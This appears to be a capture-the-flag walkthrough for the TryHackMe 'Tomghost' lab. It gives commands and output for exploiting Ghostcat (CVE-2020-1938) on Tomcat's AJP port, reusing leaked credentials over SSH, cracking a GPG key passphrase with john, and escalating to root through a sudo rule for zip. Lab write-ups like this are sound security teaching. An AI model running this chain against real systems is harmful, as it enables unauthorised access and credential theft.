# Tomghost
![tryhackme_logo](https://user-images.githubusercontent.com/83867734/185771149-cb02c6f2-8476-4ab3-a626-cca8db0a08bf.png)

Difficulty: **Easy**

Compromise the machine and read the user.txt and root.txt.

Admins Note: This room contains inappropriate content in the form of a username that contains a swear word and should be noted for an educational setting. - Dark

Tags
--
* AJP Connector
* Ghostcat CVE-2020-1938
* Hash Cracking
* Decryption
* Sudoers

Tools used
--
* nmap
* CVE-2020-1938.py
* gpg2john
* john
* gpg

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Athena OS
* IP Address: 10.18.98.39

Victim:
* Name: victim_machine
* IP Address: 10.10.18.94
* Other information must be gathered during the attack

Phase 1: Enumeration
--
```
sudo nmap -sS -sC -sV 10.10.18.94 -p- -T5 -vvv

<SNIP>
Initiating SYN Stealth Scan at 00:06
Scanning 10.10.18.94 [65535 ports]
Discovered open port 22/tcp on 10.10.18.94
Discovered open port 53/tcp on 10.10.18.94
Discovered open port 8080/tcp on 10.10.18.94
Discovered open port 8009/tcp on 10.10.18.94
<SNIP>
```
Interesting looking for 8009 port. It is related to AJP connector, so it could be prone to the Ghostcat CVE-2020-1938. Read https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat/blob/main/CVE-2020-1938.md for details.

Phase 2: Foothold
--
Let's retrieve an exploit and run it:
```
git clone https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat.git
cd Hacking-Vulnerability-CVE-2020-1938-Ghostcat/

python2 CVE-2020-1938.py 10.10.18.94 -p 8009 -f WEB-INF/web.xml
```
The output will contain at the end a string like:
```
  <description>
     Welcome to GhostCat
	skyfuck:8730281lkjlkjdqlksalks
  </description>
```
They seem to refer to an account. Let's use it for connecting by SSH:
```
ssh 10.10.18.94 -l skyfuck
```
Get the user flag by:
```
cat ../merlin/user.txt
```
Phase 3: Privilege Escalation
--
In the home folder of `skyfucker` user, we have two files: `credentials.pgp` (an encrypted file) and `tryhackme.asc` (a private key).

It should suggest us that the private key is used to decrypt the encrypted file, but we still need to retrieve the passphrase of the private key for decrypting. Let's copy the private key in the attacker machine and let's crack it:
```
scp skyfuck@10.10.18.94:/home/skyfuck/tryhackme.asc ./

gpg2john tryhackme.asc > gpg.hash
john gpg.hash --wordlist=./rockyou.txt

<SNIP>
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)
<SNIP>
```
Go back to the victim machine and decrypt `credential.pgp` file:
```
gpg --import tryhackme.asc
gpg --decrypt credential.pgp
<alexandrou>

merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```
Let's access by merlin account:
```
su merlin
<asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j>
```
Let's see what merlin can run as sudo:
```
sudo -l

Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```
Let's use `zip` command for zipping the root flag file and saving it in merlin current folder:
```
sudo /usr/bin/zip -1 -r flag.zip /root/root.txt

unzip flag.zip
cat root/root.txt
```
We got the root flag.